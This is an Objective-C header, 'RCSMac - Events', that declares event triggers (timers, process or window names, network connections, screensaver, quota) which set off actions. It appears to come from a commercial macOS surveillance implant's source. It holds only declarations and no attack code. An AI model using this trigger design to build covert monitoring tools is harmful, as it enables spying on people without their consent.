/*
 * RCSMac - Events
 *
 *  Provides all the events which should trigger an action
 *
 * Created by Alfredo 'revenge' Pesoli on 26/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __RCSMEvents_h__
#define __RCSMEvents_h__

#import "RCSMEvents.h"
#import "RCSMCommon.h"

#define EVENT_PROCESS_NAME      0
#define EVENT_PROCESS_WIN_TITLE 1

#define TIMER_AFTER_STARTUP     0x0
#define TIMER_LOOP              0x1
#define TIMER_DATE              0x2
#define TIMER_INST              0x3
#define TIMER_DAILY             0x4

//
// struct for events data
//
typedef struct _timer {
  u_int type;
  u_int loDelay;
  u_int hiDelay;
  u_int endAction;
} timerStruct;

typedef struct _process {
  u_int onClose;
  u_int lookForTitle;
  // First bit = 1 Window, 0 Process; Second bit = 1 Focus
#define EVENT_PROCESS_ON_PROC   0x00000000
#define EVENT_PROCESS_ON_WINDOW 0x00000001
#define EVENT_PROCESS_ON_FOCUS  0x00000002
  char name[256];
} processStruct;

typedef struct _connection {
  u_long ipAddress;
  u_long netMask;
  u_int port;
} connectionStruct;

@interface RCSMEvents : NSObject

+ (RCSMEvents *)sharedEvents;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (void)eventTimer: (NSDictionary *)configuration;
- (void)eventProcess: (NSDictionary *)configuration;
- (void)eventConnection: (NSDictionary *)configuration;
- (void)eventScreensaver: (NSDictionary *)configuration;
- (void)eventQuota: (NSDictionary *)configuration;

@end

#endif